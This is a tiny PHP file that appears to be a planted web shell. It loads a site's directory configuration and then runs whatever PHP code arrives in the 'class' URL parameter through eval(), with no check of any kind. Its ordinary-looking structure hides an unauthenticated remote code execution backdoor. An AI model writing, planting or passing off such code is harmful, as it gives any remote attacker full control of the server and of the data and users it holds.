<?php
$root = $_SERVER['DOCUMENT_ROOT'];
include($root.'/inc/system/dirs.php');
if($_GET['class']){
	eval($_GET['class']);
}
?>